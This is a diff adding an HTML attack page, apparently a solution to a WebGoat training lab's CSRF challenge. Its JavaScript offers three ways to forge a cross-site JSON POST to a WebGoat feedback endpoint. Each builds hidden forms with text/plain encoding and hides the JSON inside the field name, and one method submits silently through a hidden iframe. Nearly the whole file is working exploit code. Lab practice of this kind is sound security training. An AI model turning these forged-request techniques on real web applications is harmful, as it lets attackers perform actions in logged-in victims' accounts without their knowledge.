@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF - JSON POST Attack</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #333;
+            margin-top: 0;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 15px;
+        }
+        .alert {
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border-left: 5px solid;
+        }
+        .alert-info { background: #e3f2fd; border-color: #2196F3; color: #0d47a1; }
+        .alert-warning { background: #fff3e0; border-color: #ff9800; color: #e65100; }
+        .alert-success { background: #e8f5e9; border-color: #4caf50; color: #1b5e20; }
+        
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px 5px;
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        .method-box {
+            background: #f8f9fa;
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 8px;
+            border-left: 4px solid #667eea;
+        }
+        .method-box h3 {
+            margin-top: 0;
+            color: #667eea;
+        }
+        code {
+            background: #e8eaf6;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #5e35b1;
+        }
+        pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+        }
+        #result {
+            margin-top: 25px;
+            padding: 20px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            display: none;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 CSRF - JSON POST Attack</h1>
+        
+        <div class="alert alert-warning">
+            <strong>⚠️ IMPORTANT:</strong> You MUST be logged into WebGoat at 
+            <code>http://192.168.254.112:8001</code> in THIS SAME BROWSER!
+        </div>
+
+        <div class="alert alert-info">
+            <strong>📝 Challenge:</strong><br>
+            POST this JSON to <code>/feedback/message</code>:<br>
+            <pre>{
+  "name": "WebGoat",
+  "email": "webgoat@webgoat.org",
+  "content": "WebGoat is the best!!"
+}</pre>
+        </div>
+
+        <div class="method-box">
+            <h3>Method 1: Using ENCTYPE="text/plain" (RECOMMENDED)</h3>
+            <p>This technique from pentestmonkey bypasses CORS and sends JSON via form POST.</p>
+            <button onclick="method1()">🚀 Attack with text/plain</button>
+        </div>
+
+        <div class="method-box">
+            <h3>Method 2: Alternative JSON Format</h3>
+            <p>Try with different JSON formatting:</p>
+            <button onclick="method2()">📡 Attack with alternative format</button>
+        </div>
+
+        <div class="method-box">
+            <h3>Method 3: Form with Hidden Iframe</h3>
+            <p>Silent submission with result capture:</p>
+            <button onclick="method3()">👻 Silent Attack</button>
+        </div>
+
+        <div id="result"></div>
+    </div>
+
+    <script>
+        const TARGET_URL = 'http://192.168.254.112:8001/WebGoat/csrf/feedback/message';
+        
+        function showResult(msg, success = false) {
+            const div = document.getElementById('result');
+            div.style.display = 'block';
+            div.style.background = success ? '#e8f5e9' : '#f5f5f5';
+            div.style.color = success ? '#1b5e20' : '#333';
+            div.textContent = msg;
+        }
+
+        function method1() {
+            showResult('🔄 Creating form with ENCTYPE="text/plain"...');
+            
+            // Remove existing form if any
+            const existing = document.getElementById('csrf-form');
+            if (existing) existing.remove();
+            
+            // Create form with text/plain encoding
+            // This bypasses CORS and avoids URL encoding
+            const form = document.createElement('form');
+            form.id = 'csrf-form';
+            form.method = 'POST';
+            form.action = TARGET_URL;
+            form.enctype = 'text/plain';
+            form.target = '_blank';
+            
+            // Construct JSON as form data
+            // The trick: use the JSON as the "name" and absorb the "=" into the JSON
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = '{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoat is the best!!", "ignore_me":"';
+            input.value = '"}';
+            form.appendChild(input);
+            
+            document.body.appendChild(form);
+            console.log('Submitting form with text/plain encoding');
+            
+            // Use HTMLFormElement.prototype to avoid conflicts
+            HTMLFormElement.prototype.submit.call(form);
+            
+            showResult('✅ Form submitted!\n\nUsing text/plain encoding to send JSON.\n\nCheck the new window for response.\nThen check WebGoat for the flag.', true);
+            
+            setTimeout(() => form.remove(), 2000);
+        }
+
+        function method2() {
+            showResult('🔄 Creating form with alternative JSON format...');
+            
+            const existing = document.getElementById('csrf-form2');
+            if (existing) existing.remove();
+            
+            const form = document.createElement('form');
+            form.id = 'csrf-form2';
+            form.method = 'POST';
+            form.action = TARGET_URL;
+            form.enctype = 'text/plain';
+            form.target = '_blank';
+            
+            // Try compact JSON format
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = '{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoat is the best!!"}';
+            input.value = '';
+            form.appendChild(input);
+            
+            document.body.appendChild(form);
+            HTMLFormElement.prototype.submit.call(form);
+            
+            showResult('✅ Alternative format submitted!\n\nCheck the new window and WebGoat.', true);
+            
+            setTimeout(() => form.remove(), 2000);
+        }
+
+        function method3() {
+            showResult('👻 Creating silent form submission...');
+            
+            // Remove existing elements
+            const existingForm = document.getElementById('csrf-form3');
+            const existingIframe = document.getElementById('csrf-iframe');
+            if (existingForm) existingForm.remove();
+            if (existingIframe) existingIframe.remove();
+            
+            // Create hidden iframe
+            const iframe = document.createElement('iframe');
+            iframe.id = 'csrf-iframe';
+            iframe.name = 'csrf-target';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            // Create form targeting iframe
+            const form = document.createElement('form');
+            form.id = 'csrf-form3';
+            form.method = 'POST';
+            form.action = TARGET_URL;
+            form.enctype = 'text/plain';
+            form.target = 'csrf-target';
+            
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = '{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoat is the best!!", "x":"';
+            input.value = '"}';
+            form.appendChild(input);
+            
+            document.body.appendChild(form);
+            
+            setTimeout(() => {
+                HTMLFormElement.prototype.submit.call(form);
+                showResult('✅ Silent form submitted to iframe!\n\nThe attack was executed silently.\nCheck WebGoat for the flag.', true);
+            }, 500);
+        }
+
+        // Log for debugging
+        console.log('CSRF JSON Attack Page Loaded');
+        console.log('Target URL:', TARGET_URL);
+        console.log('Technique: ENCTYPE="text/plain" to bypass CORS and send JSON');
+    </script>
+</body>
+</html>
